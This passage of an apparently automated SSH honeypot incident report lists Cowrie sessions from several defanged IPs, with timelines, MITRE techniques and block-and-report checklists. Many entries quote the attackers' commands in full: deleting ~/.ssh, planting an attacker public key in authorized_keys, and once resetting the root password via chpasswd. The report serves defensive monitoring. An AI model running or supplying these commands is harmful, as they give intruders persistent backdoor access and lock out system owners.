| **First Seen** | 2026-06-01 05:11 |
| **Last Seen** | 2026-06-01 05:16 |
| **Session Duration** | 300s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2jrEVox7zdyb"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:11:29` | `cowrie.session.connect` |
| `2026-06-01 05:11:29` | `cowrie.client.version` |
| `2026-06-01 05:11:29` | `cowrie.client.kex` |
| `2026-06-01 05:11:30` | `cowrie.login.success` |
| `2026-06-01 05:11:30` | `cowrie.session.params` |
| `2026-06-01 05:11:30` | `cowrie.command.input` |
| `2026-06-01 05:11:30` | `cowrie.command.failed` |
| `2026-06-01 05:11:30` | `cowrie.log.closed` |
| `2026-06-01 05:11:31` | `cowrie.session.params` |
| `2026-06-01 05:11:31` | `cowrie.command.input` |
| `2026-06-01 05:11:31` | `cowrie.session.file_download` |
| `2026-06-01 05:11:31` | `cowrie.log.closed` |
| `2026-06-01 05:11:43` | `cowrie.session.params` |
| `2026-06-01 05:11:43` | `cowrie.command.input` |
| `2026-06-01 05:11:43` | `cowrie.log.closed` |
| `2026-06-01 05:11:44` | `cowrie.session.params` |
| `2026-06-01 05:11:44` | `cowrie.command.input` |
| `2026-06-01 05:11:44` | `cowrie.log.closed` |
| `2026-06-01 05:16:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.53.168[.]23` to AbuseIPDB if not already reported
- [ ] Block `163.53.168[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97bc471b390

| Field | Detail |
|---|---|
| **Source IP** | `18.144.3[.]82` |
| **First Seen** | 2026-06-01 05:12 |
| **Last Seen** | 2026-06-01 05:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:12:14` | `cowrie.session.connect` |
| `2026-06-01 05:12:14` | `cowrie.client.version` |
| `2026-06-01 05:12:15` | `cowrie.client.kex` |
| `2026-06-01 05:12:16` | `cowrie.login.success` |
| `2026-06-01 05:12:16` | `cowrie.session.params` |
| `2026-06-01 05:12:16` | `cowrie.command.input` |
| `2026-06-01 05:12:16` | `cowrie.command.failed` |
| `2026-06-01 05:12:17` | `cowrie.log.closed` |
| `2026-06-01 05:12:17` | `cowrie.session.params` |
| `2026-06-01 05:12:17` | `cowrie.command.input` |
| `2026-06-01 05:12:17` | `cowrie.session.file_download` |
| `2026-06-01 05:12:17` | `cowrie.log.closed` |
| `2026-06-01 05:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `18.144.3[.]82` to AbuseIPDB if not already reported
- [ ] Block `18.144.3[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477444b91c22

| Field | Detail |
|---|---|
| **Source IP** | `18.144.3[.]82` |
| **First Seen** | 2026-06-01 05:12 |
| **Last Seen** | 2026-06-01 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:12:20` | `cowrie.session.connect` |
| `2026-06-01 05:12:20` | `cowrie.client.version` |
| `2026-06-01 05:12:20` | `cowrie.client.kex` |
| `2026-06-01 05:12:21` | `cowrie.login.success` |
| `2026-06-01 05:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `18.144.3[.]82` to AbuseIPDB if not already reported
- [ ] Block `18.144.3[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef474d81ad49

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:19 |
| **Last Seen** | 2026-06-01 05:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:19:05` | `cowrie.session.connect` |
| `2026-06-01 05:19:05` | `cowrie.client.version` |
| `2026-06-01 05:19:06` | `cowrie.client.kex` |
| `2026-06-01 05:19:07` | `cowrie.login.success` |
| `2026-06-01 05:19:07` | `cowrie.session.params` |
| `2026-06-01 05:19:07` | `cowrie.command.input` |
| `2026-06-01 05:19:07` | `cowrie.command.failed` |
| `2026-06-01 05:19:07` | `cowrie.log.closed` |
| `2026-06-01 05:19:08` | `cowrie.session.params` |
| `2026-06-01 05:19:08` | `cowrie.command.input` |
| `2026-06-01 05:19:08` | `cowrie.session.file_download` |
| `2026-06-01 05:19:08` | `cowrie.log.closed` |
| `2026-06-01 05:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc18fa44628

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:19 |
| **Last Seen** | 2026-06-01 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:19:11` | `cowrie.session.connect` |
| `2026-06-01 05:19:11` | `cowrie.client.version` |
| `2026-06-01 05:19:11` | `cowrie.client.kex` |
| `2026-06-01 05:19:12` | `cowrie.login.success` |
| `2026-06-01 05:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a6bf7737a9f

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:21 |
| **Last Seen** | 2026-06-01 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:21:23` | `cowrie.session.connect` |
| `2026-06-01 05:21:23` | `cowrie.client.version` |
| `2026-06-01 05:21:23` | `cowrie.client.kex` |
| `2026-06-01 05:21:23` | `cowrie.login.success` |
| `2026-06-01 05:21:24` | `cowrie.session.params` |
| `2026-06-01 05:21:24` | `cowrie.command.input` |
| `2026-06-01 05:21:24` | `cowrie.command.failed` |
| `2026-06-01 05:21:24` | `cowrie.log.closed` |
| `2026-06-01 05:21:24` | `cowrie.session.params` |
| `2026-06-01 05:21:24` | `cowrie.command.input` |
| `2026-06-01 05:21:24` | `cowrie.session.file_download` |
| `2026-06-01 05:21:24` | `cowrie.log.closed` |
| `2026-06-01 05:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21f0f669cd4

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:21 |
| **Last Seen** | 2026-06-01 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:21:25` | `cowrie.session.connect` |
| `2026-06-01 05:21:25` | `cowrie.client.version` |
| `2026-06-01 05:21:25` | `cowrie.client.kex` |
| `2026-06-01 05:21:26` | `cowrie.login.success` |
| `2026-06-01 05:21:26` | `cowrie.session.params` |
| `2026-06-01 05:21:26` | `cowrie.command.input` |
| `2026-06-01 05:21:26` | `cowrie.command.failed` |
| `2026-06-01 05:21:27` | `cowrie.log.closed` |
| `2026-06-01 05:21:27` | `cowrie.session.params` |
| `2026-06-01 05:21:27` | `cowrie.command.input` |
| `2026-06-01 05:21:27` | `cowrie.session.file_download` |
| `2026-06-01 05:21:27` | `cowrie.log.closed` |
| `2026-06-01 05:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b655c3d26e

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:21 |
| **Last Seen** | 2026-06-01 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:21:26` | `cowrie.session.connect` |
| `2026-06-01 05:21:26` | `cowrie.client.version` |
| `2026-06-01 05:21:27` | `cowrie.client.kex` |
| `2026-06-01 05:21:27` | `cowrie.login.success` |
| `2026-06-01 05:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db122fe5ab82

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:21 |
| **Last Seen** | 2026-06-01 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:21:29` | `cowrie.session.connect` |
| `2026-06-01 05:21:29` | `cowrie.client.version` |
| `2026-06-01 05:21:29` | `cowrie.client.kex` |
| `2026-06-01 05:21:30` | `cowrie.login.success` |
| `2026-06-01 05:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.39.234[.]65` to AbuseIPDB if not already reported
- [ ] Block `118.39.234[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecefd7b21f3b

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:21 |
| **Last Seen** | 2026-06-01 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:21:30` | `cowrie.session.connect` |
| `2026-06-01 05:21:30` | `cowrie.client.version` |
| `2026-06-01 05:21:30` | `cowrie.client.kex` |
| `2026-06-01 05:21:31` | `cowrie.login.success` |
| `2026-06-01 05:21:31` | `cowrie.session.params` |
| `2026-06-01 05:21:31` | `cowrie.command.input` |
| `2026-06-01 05:21:31` | `cowrie.command.failed` |
| `2026-06-01 05:21:31` | `cowrie.log.closed` |
| `2026-06-01 05:21:31` | `cowrie.session.params` |
| `2026-06-01 05:21:31` | `cowrie.command.input` |
| `2026-06-01 05:21:32` | `cowrie.session.file_download` |
| `2026-06-01 05:21:32` | `cowrie.log.closed` |
| `2026-06-01 05:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba2c0f961d8

| Field | Detail |
|---|---|
| **Source IP** | `34.78.29[.]97` |
| **First Seen** | 2026-06-01 05:21 |
| **Last Seen** | 2026-06-01 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:21:34` | `cowrie.session.connect` |
| `2026-06-01 05:21:34` | `cowrie.client.version` |
| `2026-06-01 05:21:34` | `cowrie.client.kex` |
| `2026-06-01 05:21:34` | `cowrie.login.success` |
| `2026-06-01 05:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5e69c74f0d7

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:22 |
| **Last Seen** | 2026-06-01 05:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:22:10` | `cowrie.session.connect` |
| `2026-06-01 05:22:10` | `cowrie.client.version` |
| `2026-06-01 05:22:10` | `cowrie.client.kex` |
| `2026-06-01 05:22:11` | `cowrie.login.success` |
| `2026-06-01 05:22:11` | `cowrie.session.params` |
| `2026-06-01 05:22:11` | `cowrie.command.input` |
| `2026-06-01 05:22:11` | `cowrie.command.failed` |
| `2026-06-01 05:22:12` | `cowrie.log.closed` |
| `2026-06-01 05:22:12` | `cowrie.session.params` |
| `2026-06-01 05:22:12` | `cowrie.command.input` |
| `2026-06-01 05:22:12` | `cowrie.session.file_download` |
| `2026-06-01 05:22:12` | `cowrie.log.closed` |
| `2026-06-01 05:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7257e49ed63

| Field | Detail |
|---|---|
| **Source IP** | `40.121.200[.]75` |
| **First Seen** | 2026-06-01 05:22 |
| **Last Seen** | 2026-06-01 05:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:22:15` | `cowrie.session.connect` |
| `2026-06-01 05:22:15` | `cowrie.client.version` |
| `2026-06-01 05:22:15` | `cowrie.client.kex` |
| `2026-06-01 05:22:16` | `cowrie.login.success` |
| `2026-06-01 05:22:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.121.200[.]75` to AbuseIPDB if not already reported
- [ ] Block `40.121.200[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dec23b4f25c

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:22 |
| **Last Seen** | 2026-06-01 05:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:22:44` | `cowrie.session.connect` |
| `2026-06-01 05:22:44` | `cowrie.client.version` |
| `2026-06-01 05:22:44` | `cowrie.client.kex` |
| `2026-06-01 05:22:45` | `cowrie.login.success` |
| `2026-06-01 05:22:45` | `cowrie.session.params` |
| `2026-06-01 05:22:45` | `cowrie.command.input` |
| `2026-06-01 05:22:45` | `cowrie.command.failed` |
| `2026-06-01 05:22:46` | `cowrie.log.closed` |
| `2026-06-01 05:22:46` | `cowrie.session.params` |
| `2026-06-01 05:22:46` | `cowrie.command.input` |
| `2026-06-01 05:22:46` | `cowrie.session.file_download` |
| `2026-06-01 05:22:46` | `cowrie.log.closed` |
| `2026-06-01 05:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2b071b8cc9

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-01 05:22 |
| **Last Seen** | 2026-06-01 05:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:22:48` | `cowrie.session.connect` |
| `2026-06-01 05:22:48` | `cowrie.client.version` |
| `2026-06-01 05:22:48` | `cowrie.client.kex` |
| `2026-06-01 05:22:49` | `cowrie.login.success` |
| `2026-06-01 05:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-548660ee04f5

| Field | Detail |
|---|---|
| **Source IP** | `118.39.234[.]65` |
| **First Seen** | 2026-06-01 05:23 |
| **Last Seen** | 2026-06-01 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 05:23:07` | `cowrie.session.connect` |
| `2026-06-01 05:23:07` | `cowrie.client.version` |
| `2026-06-01 05:23:07` | `cowrie.client.kex` |
| `2026-06-01 05:23:07` | `cowrie.login.success` |
| `2026-06-01 05:23:08` | `cowrie.session.params` |
| `2026-06-01 05:23:08` | `cowrie.command.input` |
| `2026-06-01 05:23:08` | `cowrie.command.failed` |
| `2026-06-01 05:23:08` | `cowrie.log.closed` |
| `2026-06-01 05:23:08` | `cowrie.session.params` |
| `2026-06-01 05:23:08` | `cowrie.command.input` |
